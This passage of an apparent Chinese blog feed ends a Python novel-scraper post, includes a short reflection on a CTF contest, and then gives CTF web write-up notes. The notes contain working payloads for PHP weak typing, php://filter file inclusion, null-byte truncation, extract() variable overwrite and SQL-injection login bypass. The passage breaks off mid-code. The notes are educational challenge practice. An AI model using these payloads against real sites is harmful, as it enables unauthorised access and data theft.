class="function"><span class="keyword">def</span> <span class="title">get_chapter</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.len</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_description</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.description</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    book = Bookspider()</span><br><span class="line">    name = input(<span class="string">'[*]请输入书名：'</span>)</span><br><span class="line">    <span class="comment">#查书</span></span><br><span class="line">    locations = book.book_search(name)</span><br><span class="line">    item_sum = book.get_item()</span><br><span class="line">    <span class="comment">#以下为两种搜索结果的处理，1.所爬的书籍在全书网是唯一的，2.所爬的书籍在全书网有多本</span></span><br><span class="line">    <span class="keyword">if</span> item_sum == <span class="number">1</span>:</span><br><span class="line">        book.set_location(locations[<span class="number">0</span>])</span><br><span class="line">        book.book_info()</span><br><span class="line">        print(<span class="string">'[*]%s共%d条搜索结果：\n'</span>%(name,item_sum))</span><br><span class="line">        print(<span class="string">'#'</span>*<span class="number">150</span>)</span><br><span class="line">        print(<span class="string">'[*]书名：%s'</span>%book.get_bookname())</span><br><span class="line">        print(<span class="string">'[*]作者：%s'</span>%book.get_author())</span><br><span class="line">        print(<span class="string">'[*]简介：%s'</span>%book.get_description())</span><br><span class="line">        print(<span class="string">'#'</span>*<span class="number">150</span>)</span><br><span class="line">        choose1 = input(<span class="string">'[*]是否继续下载？(y/n)'</span>)</span><br><span class="line">        <span class="keyword">if</span> choose1 == <span class="string">'y'</span> <span class="keyword">or</span> choose1 == <span class="string">'Y'</span>:</span><br><span class="line">            print(<span class="string">'\n[*]正在下载《%s》'</span>%book.get_bookname())</span><br><span class="line">            <span class="comment">#保存文本</span></span><br><span class="line">            book.save()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\n[*]感谢使用！'</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        print(<span class="string">'[*]%s共%d条搜索结果：\n'</span>%(name,item_sum))</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> locations:</span><br><span class="line">            print(<span class="string">'#'</span>*<span class="number">150</span>)</span><br><span class="line">            print(<span class="string">'[*]序号：%d'</span>%(j+<span class="number">1</span>))</span><br><span class="line">            print(<span class="string">'[*]书名：%s'</span>%item[<span class="number">1</span>])</span><br><span class="line">            print(<span class="string">'[*]作者：%s'</span>%item[<span class="number">2</span>])</span><br><span class="line">            print(<span class="string">'[*]简介：%s'</span>%item[<span class="number">3</span>])</span><br><span class="line">            print(<span class="string">'#'</span>*<span class="number">150</span>)</span><br><span class="line">            j +=<span class="number">1</span></span><br><span class="line">        choose2 = int(input(<span class="string">'\n\n请选择序号：'</span>))</span><br><span class="line">        <span class="keyword">if</span> choose2 &gt;= <span class="number">1</span> <span class="keyword">and</span> choose2 &lt;= item_sum:</span><br><span class="line">            print(<span class="string">'\n[*]正在下载《%s》'</span>%locations[choose2<span class="number">-1</span>][<span class="number">1</span>])</span><br><span class="line">            <span class="comment">#设置书籍链接地址</span></span><br><span class="line">            book.set_location(locations[choose2<span class="number">-1</span>][<span class="number">0</span>])</span><br><span class="line">            book.book_info()</span><br><span class="line">            <span class="comment">#保存文本</span></span><br><span class="line">            book.save()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\n[*]感谢使用！'</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'\n[*]下载成功！'</span>)</span><br></pre></td></tr></table></figure><h1 id="部分运行截图："><a href="#部分运行截图：" class="headerlink" title="部分运行截图："></a>部分运行截图：</h1><p><img src="/2018/11/07/爬取某书网指定小说/start.png" alt="开始"></p><p><img src="/2018/11/07/爬取某书网指定小说/select.png" alt="选择"></p><p><img src="/2018/11/07/爬取某书网指定小说/ing.png" alt="运行中"></p><h1 id="下载的文本文件："><a href="#下载的文本文件：" class="headerlink" title="下载的文本文件："></a>下载的文本文件：</h1><p><img src="/2018/11/07/爬取某书网指定小说/wb.png" alt="文本"></p><h1 id="更新（2018年11月26日）"><a href="#更新（2018年11月26日）" class="headerlink" title="更新（2018年11月26日）"></a>更新（2018年11月26日）</h1><p>后期使用过程发现还有不少bug，不过毕竟算第一篇爬虫，这边就不删除了，留个纪念吧！较完善的服务器版本在这里：<a href="https://blog.suqir.xyz/2018/12/15/%E7%88%AC%E5%8F%96%E6%9F%90%E4%B9%A6%E7%BD%91%E6%8C%87%E5%AE%9A%E5%B0%8F%E8%AF%B4-%E5%BE%AE%E4%BF%A1%E7%89%88/#more">爬取某书网指定小说-微信版</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;初探Python - 用Python实现对小说的爬取并下载&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="https://blog.suqir.xyz/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>记一次CTF大赛的感受</title>
    <link href="https://blog.suqir.xyz/2018/10/29/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E5%A4%A7%E8%B5%9B%E7%9A%84%E6%84%9F%E5%8F%97/"/>
    <id>https://blog.suqir.xyz/2018/10/29/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E5%A4%A7%E8%B5%9B%E7%9A%84%E6%84%9F%E5%8F%97/</id>
    <published>2018-10-29T08:44:10.000Z</published>
    <updated>2020-03-18T10:47:08.699Z</updated>
    
    <content type="html"><![CDATA[<p>对山东省网络技术大赛的参赛体会和总结</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>10月27号的山东省网络技术大赛是我大学参加过的第一个比赛，在这个比赛中我和各大高校的大佬们共同在网络攻防CTF夺旗赛这一命题中进行角逐。其实在去之前我的心里是没有多少信心的（事实证明我的担心是有必要的），同时寄希望于其他选手水平也差不多，我也只看过一些基础的web方向的解题方法，只看过几篇关于隐写的题，因为在我看来这种比赛应该不会涉及到密码，逆向，溢出和隐写等等这几类题，然而。。。</p><p>先分享一下我比赛最后的排名情况：</p><p><img src="/2018/10/29/记一次CTF大赛的感受/wlkjds_ctf.png" alt="image"></p><p>我的成绩在里面不是特别理想，在39名选手中排在第11位，得分仅331，与前三名一千多的得分更是有着不小的差距（小声哔哔：前三是来自警察学院的未来的网警），但究其根本还是自己在网络安全这一领域还有很长的路要走。</p><p>下面是在这次比赛中我得到的一些经验和教训，特地分享出来，一来警示自己，二来以作交流。另外，我会在后面把所有题做一遍并写一篇write up(如果官方还没有关闭训练场)</p><h1 id="不足"><a href="#不足" class="headerlink" title="不足"></a>不足</h1><ol><li>过分自信，轻视对手</li><li>解题时心静不下来，导致做题时没有深入，往往错过很多会做的题</li><li>没有设立明确的目标，导致会的题因为较其他选手稍晚得到flag，得分较低；不会的题又没有尝试去解</li><li>在网络安全领域坐井观天，没有保持一颗学习的心态</li></ol><h1 id="受益"><a href="#受益" class="headerlink" title="受益"></a>受益</h1><ol><li>心中始终坚信：学无止境</li><li>积累了大赛经验，后续参加此类比赛不至于手忙脚乱</li><li>坚守自己的底线</li></ol><h1 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h1><p>在经历了此次比赛后，虽然没有取得满意的成绩，但也更加坚定了对未来继续扩展学习方向的信心。接下来的近一年时间，我将根据时间安排准备下一届的网络安全大赛，同时进行PHP、Python等语言的学习，争取将各个CTF大赛的题看一遍write up或自己试解，希望能在下一届的比赛中获得一个令自己比较满意的成绩。</p><p><strong>人生没有退路，只有不停地选择！</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;对山东省网络技术大赛的参赛体会和总结&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透" scheme="https://blog.suqir.xyz/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>CTF</title>
    <link href="https://blog.suqir.xyz/2018/10/12/CTF/"/>
    <id>https://blog.suqir.xyz/2018/10/12/CTF/</id>
    <published>2018-10-12T09:52:11.000Z</published>
    <updated>2020-03-18T10:46:48.668Z</updated>
    
    <content type="html"><![CDATA[<p>本文总结了CTF中我所遇到的题型及其write up，本文长期更新</p><a id="more"></a><p>希望各位多多评论指正，也算作对我第一次写技术文章的鼓励！</p><hr><p>训练场：<a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">南京邮电大学CTF题库</a></p><hr><h1 id="直接查看源码"><a href="#直接查看源码" class="headerlink" title="直接查看源码"></a>直接查看源码</h1><p>出现场景：一般出现在第一题</p><p>write  up： 直接Ctrl+u查看网页源码寻找flag</p><h1 id="修改maxlength"><a href="#修改maxlength" class="headerlink" title="修改maxlength"></a>修改maxlength</h1><p>出现场景：输入框输入内容有位数限制</p><p>write up：F12进入开发者模式修改maxlength后提交</p><h1 id="IP伪造"><a href="#IP伪造" class="headerlink" title="IP伪造"></a>IP伪造</h1><p>各种伪造IP的HTTP头：</p><table><thead><tr><th>序号</th><th>伪造方式</th></tr></thead><tbody><tr><td>1</td><td>X-Forwarded-For</td></tr><tr><td>2</td><td>Client-IP</td></tr><tr><td>3</td><td>x-remote-IP</td></tr><tr><td>4</td><td>x-originating-IP</td></tr><tr><td>5</td><td>x-remote-addr</td></tr></tbody></table><h1 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h1><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       $one = ord(<span class="string">'1'</span>);</span><br><span class="line">       $nine = ord(<span class="string">'9'</span>);</span><br><span class="line">       <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">       &#123;   </span><br><span class="line">               $digit = ord($number&#123;$i&#125;);</span><br><span class="line">               <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">               &#123;</span><br><span class="line">                       <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">               &#125;</span><br><span class="line">       &#125;</span><br><span class="line">          <span class="keyword">return</span> $number == <span class="string">'54975581388'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$flag=<span class="string">'*******'</span>;</span><br><span class="line"><span class="keyword">if</span>(noother_says_correct($_GET[<span class="string">'key'</span>]))</span><br><span class="line">   <span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">'access denied'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：要求传入key不包含数字[1-9]，但又等于54975581388，考虑转十六进制，发现<code>54975581388=0xccccccccc</code>,因此get方法传值<code>key=0xccccccccc</code></p><h1 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h1><h2 id="类型一"><a href="#类型一" class="headerlink" title="类型一"></a>类型一</h2><p>介绍：PHP在处理哈希字符串时，会利用“!=”或“==”<br>来对哈希值进行比较，它把每一个以”0e”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0e”开头的，那么PHP将会认为他们相同，都是0</p><p>出现场景：PHP代码审计、含md5的题</p><p>write  up：</p><p>修复方法：“===”和“!==”strict比较符，只有在类型相同时才相等。“==”和“!=”即non-strict比较符，会在类型转换后进行比较</p><p>扩展：0e开头MD5值小结</p><table><thead><tr><th>string</th><th>md5()</th></tr></thead><tbody><tr><td>s878926199a</td><td>0e545993274517709034328855841020</td></tr><tr><td>s155964671a</td><td>0e342768416822451524974117254469</td></tr><tr><td>s214587387a</td><td>0e848240448830537924465865611904</td></tr></tbody></table><h2 id="类型二"><a href="#类型二" class="headerlink" title="类型二"></a>类型二</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'b'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'a'</span>] != $_GET[<span class="string">'b'</span>])</span><br><span class="line"><span class="keyword">if</span> (md5($_GET[<span class="string">'a'</span>]) == md5($_GET[<span class="string">'b'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Wrong.'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析：$_GET可以接受数组但MD5()函数若传递进去一个数组，则会返回null.因此向$_GET数组传入两个名为a、b的不相等的数组从而导致md5()均返回空:index.php?a[]=1&amp;b[]=2（即null=null）</p><h1 id="脑洞题"><a href="#脑洞题" class="headerlink" title="脑洞题"></a>脑洞题</h1><ol><li>源码找url</li></ol><p><img src="/2018/10/12/CTF/E:/Blog/source/_posts/CTF/ccdj.png" alt="image"></p><ol start="2"><li>源码看flag</li></ol><p><img src="/2018/10/12/CTF/ccdj1.png" alt="image"></p><h1 id="jjencode-aaencode（颜文字）"><a href="#jjencode-aaencode（颜文字）" class="headerlink" title="jjencode/aaencode（颜文字）"></a>jjencode/aaencode（颜文字）</h1><p>介绍：</p><blockquote><p>什么是jjencode?</p><p>将js代码转换成只有符号的字符串</p></blockquote><blockquote><p>什么是aaencode？</p><p>将js代码转换成常用的网络表情</p></blockquote><p>aaencode加密：<a href="http://utf-8.jp/public/aaencode.html" target="_blank" rel="noopener">http://utf-8.jp/public/aaencode.html</a></p><p>解法：可以直接利用浏览器的控制台输入密文，执行后即可解密。</p><p><img src="/2018/10/12/CTF/AAencode.png" alt="image"></p><h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>典型的文件包含漏洞的格式网址：<code>php?file=xxx.php</code></p><p>原因：网页后端php（或其他）代码中使用了include等文件包含语句，而且所包含的文件由变量控制，恰恰此变量又能通过GET或POST等方式进行修改所造成的</p><p>利用方法：构建<code>file=php://filter/read=convert.base64-encode/resource=index.php</code></p><p>注：其中index.php可以为任意已包含文件返回base64加密过的index.php文件源码。</p><p><img src="/2018/10/12/CTF/wjbh.png" alt="image"></p><p>注意：python3中base64的解密为base64.b64decode()</p><h1 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h1><ol><li>精度问题</li></ol><p><code>intval()</code>这个函数的作用是把参数自动转换成整数（int）</p><blockquote><p>$id = intval(1024.5)//结果为$id==1024</p></blockquote><h1 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h1><p>介绍：robots.txt是搜索引擎中访问网站的时候要查看的第一个文件，robots.txt文件告诉了蜘蛛程序在服务器上什么文件是可以被查的。</p><h1 id="00"><a href="#00" class="headerlink" title="%00"></a>%00</h1><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'nctf'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'nctf'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'nctf'</span>], <span class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)   </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>涉及漏洞：查到资料</p><blockquote><p>1.ereg会把null视为字符串的结束，从而被%00截断，而strpos则可以越过%00</p></blockquote><blockquote><p>2.当ntf为数组时它的返回值不是FALSE</p></blockquote><p>利用方法：</p><blockquote><p>1.?nctf=1%00%23biubiubiu</p></blockquote><blockquote><p>2.?nctf[]=1</p></blockquote><h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] == <span class="string">"POST"</span>) &#123; <span class="meta">?&gt;</span></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    extract($_POST);</span><br><span class="line">    <span class="keyword">if</span> ($pass == $thepassword_123) &#123; <span class="meta">?&gt;</span></span><br><span class="line">        &lt;div class="alert alert-success"&gt;</span><br><span class="line">            &lt;code&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $theflag; <span class="meta">?&gt;</span>&lt;/code&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：<code>extract()</code>函数的作用：从数组中将变量导入到当前的符号表</p><blockquote><p>可以看到这里的代码为：extract($_POST)，即将POST的参数导入当前的符号表</p></blockquote><p>由于<code>extract()</code>函数存在变量覆盖漏洞，所以提交post参数：</p><p><code>pass=123&amp;thepassword_123=123//或者pass[]=&amp;thepassword_123</code></p><p>即:将两个变量的值修改成相同的，即可得到flag！</p><h1 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h1><p>源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">文件上传<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"upload.php"</span> <span class="attr">method</span>=<span class="string">"post"</span></span></span><br><span class="line"><span class="tag"><span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"dir"</span> <span class="attr">value</span>=<span class="string">"/uploads/"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x00截断"><a href="#0x00截断" class="headerlink" title="0x00截断"></a>0x00截断</h2><p>绕过方法：在burpsuite—Hex中，将空格php后面一个字符的hex修改为00</p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="常规注入"><a href="#常规注入" class="headerlink" title="常规注入"></a>常规注入</h2><h3 id="正常闭合"><a href="#正常闭合" class="headerlink" title="正常闭合"></a>正常闭合</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = trim($_POST[user]);</span><br><span class="line">  $pass = md5(trim($_POST[pass]));</span><br><span class="line">  $sql=<span class="string">"select user from ctf where (user='"</span>.$user.<span class="string">"') and (pw='"</span>.$pass.<span class="string">"')"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>.$sql;</span><br><span class="line">  $query = mysql_fetch_array(mysql_query($sql));</span><br><span class="line">  <span class="keyword">if</span>($query[user]==<span class="string">"admin"</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>($query[user] != <span class="string">"admin"</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;You are not admin!&lt;/p&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $query[user];</span><br></pre></td></tr></table></figure><p>分析：会对传入参数两端去空格，然后sql拼接如下</p><p><code>$sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot;;</code></p><p>所以只要用构造一下user的值，使语法无误，然后注释掉后面的即可。</p><p>MySQL主要有三种注释方式：</p><table><thead><tr><th>注释方式</th><th>说明</th></tr></thead><tbody><tr><td>#</td><td>注释到行尾</td></tr><tr><td>/*内容*/</td><td>用于行间或多行注释（也可用/**/代替空格）</td></tr><tr><td>–</td><td>也是注释到行尾，但需要注意的是在两个减号后面至少要有一个\s，也就是空格，TAB，换行符等（’ or 1=1–    ）</td></tr></tbody></table><p>解法：本题可post：<br><code>user=admin&#39;)-- -&amp;pass=123或user=admin&#39;)#&amp;pass=123</code></p><p>sql语句就变成<code>select user from ctf where (user=&#39;admin&#39;)#&#39; and (pw=&#39;123&#39;)</code></p><p>查询语句就能成功返回user列，值为admin的那条记录。</p><h3 id="union查询"><a href="#union查询" class="headerlink" title="union查询"></a>union查询</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = $_POST[user];</span><br><span class="line">  $pass = md5($_POST[pass]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select pw from ctf where user='$user'"</span>));</span><br><span class="line">  <span class="keyword">if</span> (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>解法：关键点在源代码第7、8行。首先要观察，我们能够控制的查询结果有<code>$query[pw]</code>的值，通过让union前的查询语句为空，查询结果由union后面的语句控制即可。</p><p>例如：<code>select pw from ctf where user=&#39;-1&#39; union select &#39;mytest&#39;</code>这样查询结果pw就是’mytest’这个字符串了。再看那个if语句，只看后面的判断，实际上只要输入的和查询的结果一致就行了。</p><p>注意别忘记输入pass后，会对其进行MD5加密。所以构造post：<code>user=&#39; union select md5(&#39;suqir&#39;)#&amp;pass=suqir</code>查询语句就变为<code>SELECT * FROM users WHERE name=&#39;admin&#39; AND pass=&#39;pass&#39;;</code></p><h3 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment">#GOAL: login as admin,then get the flag;</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($str)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">$str=stripslashes($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</span><br><span class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line">$query=<span class="string">'SELECT * FROM users WHERE name=\''</span>.$username.<span class="string">'\' AND pass=\''</span>.$password.<span class="string">'\';'</span>;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line"><span class="keyword">if</span>(!$result || mysql_num_rows($result) &lt; <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid password!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>分析：这题的clean函数用来过滤引号，会将其转化为实体编码，所以我们没有办法直接用引号来闭合了，只能运用转义字符来吃掉后面的那个单引号了，即构造<code>username=suqir\&amp;password=or%201%23</code><br>使得查询语句如下</p><p><code>SELECT * FROM users WHERE name=&#39;suqir\&#39;&#39; AND pass=&#39;or%201%23&#39;</code></p><p>即</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> </span><br><span class="line"><span class="keyword">name</span>=<span class="string">'suqir\' AND pass='</span>            『 [<span class="keyword">name</span>]的值为 [<span class="string">' AND pass=]  ，显然逻辑值为false 』</span></span><br><span class="line"><span class="string">or 1                                『 但没关系，[false or 1] 的逻辑值为真』 </span></span><br><span class="line"><span class="string">#'</span>                                  『 注释掉多余的单引号 』</span><br><span class="line">即</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span 